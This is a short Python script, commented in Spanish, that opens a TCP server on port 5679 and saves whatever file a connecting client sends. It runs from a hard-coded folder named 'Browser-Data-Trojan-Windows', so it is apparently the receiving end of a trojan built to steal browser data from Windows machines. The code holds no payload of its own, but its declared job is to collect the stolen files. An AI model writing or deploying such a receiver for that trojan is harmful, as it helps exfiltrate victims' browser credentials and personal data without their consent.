import socket
import tqdm
import os

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5679
BUFFER_SIZE = 8192
SEPARATOR = b"<SEPARATOR>"



def server():
    os.chdir(r'C:\Users\Shockz\Desktop\Browser-Data-Trojan-Windows')

    #Creo el socket
    sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Enlazamos el socket a ese host y puerto
    sckt.bind((SERVER_HOST, SERVER_PORT))
    #5 peticiones max
    sckt.listen(5)

    print(f"[-] Escuchando como {SERVER_HOST}:{SERVER_PORT}")
    try:
        client_socket, address = sckt.accept()
        print(f"[-] {address} esta conectado.")

        received = client_socket.recv(BUFFER_SIZE)
        filename, filesize = received.split(SEPARATOR)
        filename = os.path.basename(filename)
        filesize = int(filesize)
        progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "wb") as f:
            while True:
                    bytes_read = client_socket.recv(BUFFER_SIZE)
                    if not bytes_read:
                        break
                    f.write(bytes_read)
                    # update the progress bar
                    progress.update(len(bytes_read))
        close(sckt)
    except (SystemExit,KeyboardInterrupt):
        close(sckt)

def close(sckt):
    #sckt.shutdown(socket.SHUT_RDWR)
    sckt.close()
    print("closed")
